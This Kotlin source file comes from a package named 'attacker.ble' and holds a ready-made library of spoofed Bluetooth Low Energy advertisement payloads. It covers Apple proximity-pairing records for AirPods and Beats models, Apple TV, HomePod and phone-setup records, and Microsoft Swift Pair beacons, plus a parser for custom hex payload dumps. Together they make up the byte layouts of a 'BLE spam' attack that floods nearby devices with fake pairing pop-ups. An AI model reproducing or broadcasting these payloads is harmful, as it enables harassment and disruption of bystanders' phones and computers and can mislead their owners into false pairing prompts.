package com.komugi.attacker.ble

import java.util.Locale

/**
 * Wire format of one advertisement burst.
 *
 * [companyId] goes into the AD type 0xFF manufacturer field, [data] is everything
 * after it. Android caps a legacy advertisement at 31 bytes including the three byte
 * flags record and the four byte manufacturer header, which leaves 24 bytes of payload.
 */
data class BlePayload(
    val id: String,
    val label: String,
    val family: PayloadFamily,
    val companyId: Int,
    val data: ByteArray,
) {
    fun toHex(): String = buildString {
        append(String.format(Locale.US, "%02X%02X ", (companyId shr 8) and 0xFF, companyId and 0xFF))
        data.forEach { append(String.format(Locale.US, "%02X ", it.toInt() and 0xFF)) }
    }.trim()

    override fun equals(other: Any?): Boolean =
        other is BlePayload && other.id == id

    override fun hashCode(): Int = id.hashCode()
}

enum class PayloadFamily(val title: String) {
    APPLE("Apple proximity"),
    APPLE_TV("Apple TV setup"),
    SWIFT_PAIR("Microsoft Swift Pair"),
    CUSTOM("Custom hex"),
}

object Payloads {

    /** Maximum payload bytes that still fit a legacy 31 byte advertisement. */
    const val MAX_PAYLOAD_BYTES = 24

    private val APPLE_PROXIMITY_MODELS: List<Pair<String, Int>> = listOf(
        "AirPods" to 0x02,
        "AirPods Pro" to 0x0E,
        "AirPods Max" to 0x0A,
        "AirPods Gen 2" to 0x0F,
        "AirPods Gen 3" to 0x13,
        "AirPods Pro Gen 2" to 0x14,
        "PowerBeats" to 0x03,
        "PowerBeats Pro" to 0x0B,
        "Beats Solo Pro" to 0x0C,
        "Beats Studio Buds" to 0x11,
        "Beats Flex" to 0x10,
        "BeatsX" to 0x05,
        "Beats Solo3" to 0x06,
        "Beats Studio3" to 0x09,
        "Beats Studio Pro" to 0x17,
        "Beats Fit Pro" to 0x12,
        "Beats Studio Buds+" to 0x16,
    )

    private val APPLE_TV_VARIANTS: List<Pair<String, Int>> = listOf(
        "AppleTV Setup" to 0x01,
        "AppleTV Pair" to 0x06,
        "AppleTV New User" to 0x20,
        "AppleTV AppleID Setup" to 0x2B,
        "AppleTV Wireless Audio Sync" to 0xC0,
        "AppleTV HomeKit Setup" to 0x0D,
        "AppleTV Keyboard" to 0x13,
        "AppleTV Connecting to Network" to 0x27,
        "HomePod Setup" to 0x0B,
        "Setup New Phone" to 0x09,
        "Transfer Number to New Phone" to 0x02,
        "TV Color Balance" to 0x1E,
    )

    val apple: List<BlePayload> = APPLE_PROXIMITY_MODELS.map { (name, model) ->
        BlePayload(
            id = "apple_$model",
            label = name,
            family = PayloadFamily.APPLE,
            companyId = 0x004C,
            data = appleProximity(model),
        )
    }

    val appleTv: List<BlePayload> = APPLE_TV_VARIANTS.map { (name, variant) ->
        BlePayload(
            id = "appletv_$variant",
            label = name,
            family = PayloadFamily.APPLE_TV,
            companyId = 0x004C,
            data = appleTv(variant),
        )
    }

    val swiftPair: List<BlePayload> = listOf(
        BlePayload(
            id = "swift_pair_a",
            label = "Swift Pair beacon",
            family = PayloadFamily.SWIFT_PAIR,
            companyId = 0x0006,
            data = byteArrayOf(0x03, 0x03, 0x00, 0x80.toByte(), 0x00, 0x00),
        ),
        BlePayload(
            id = "swift_pair_b",
            label = "Swift Pair beacon (alt)",
            family = PayloadFamily.SWIFT_PAIR,
            companyId = 0x0006,
            data = byteArrayOf(0x03, 0x03, 0x01, 0x80.toByte(), 0x01, 0x00),
        ),
    )

    val all: List<BlePayload> = apple + appleTv + swiftPair

    val families: List<PayloadFamily> = PayloadFamily.entries

    fun forFamily(family: PayloadFamily): List<BlePayload> = when (family) {
        PayloadFamily.APPLE -> apple
        PayloadFamily.APPLE_TV -> appleTv
        PayloadFamily.SWIFT_PAIR -> swiftPair
        PayloadFamily.CUSTOM -> emptyList()
    }

    /**
     * Proximity pairing record. Layout after the company id:
     * `07 19 07 <model> 20 75 AA 30 01 00 00 45 12 12 12` plus zero padding.
     */
    private fun appleProximity(model: Int): ByteArray = byteArrayOf(
        0x07, 0x19, 0x07, model.toByte(),
        0x20, 0x75, 0xAA.toByte(), 0x30, 0x01,
        0x00, 0x00, 0x45, 0x12, 0x12, 0x12,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    )

    /**
     * Setup payload record. Layout after the company id:
     * `04 04 2A 00 00 00 0F 05 C1 <variant> 60 4C 95 00 00 10 00 00 00`.
     */
    private fun appleTv(variant: Int): ByteArray = byteArrayOf(
        0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05,
        0xC1.toByte(), variant.toByte(), 0x60, 0x4C, 0x95.toByte(),
        0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
    )

    /**
     * Parses `4C00071907...` style input. Two or four leading hex characters are treated
     * as the company id when [companyOverride] is null, matching how payload dumps are shared.
     */
    fun parseCustom(hex: String, companyOverride: Int?): BlePayload? {
        val clean = hex.replace(Regex("[^0-9a-fA-F]"), "")
        if (clean.length < 6 || clean.length % 2 != 0) return null
        val bytes = ByteArray(clean.length / 2) { i ->
            clean.substring(i * 2, i * 2 + 2).toInt(16).toByte()
        }
        val companyId = companyOverride ?: ((bytes[0].toInt() and 0xFF) shl 8) or (bytes[1].toInt() and 0xFF)
        val body = if (companyOverride == null) bytes.drop(2).toByteArray() else bytes
        if (body.size > MAX_PAYLOAD_BYTES) return null
        return BlePayload(
            id = "custom",
            label = "Custom payload",
            family = PayloadFamily.CUSTOM,
            companyId = companyId,
            data = body,
        )
    }

    private fun List<Byte>.toByteArray(): ByteArray = ByteArray(size) { this[it] }
}
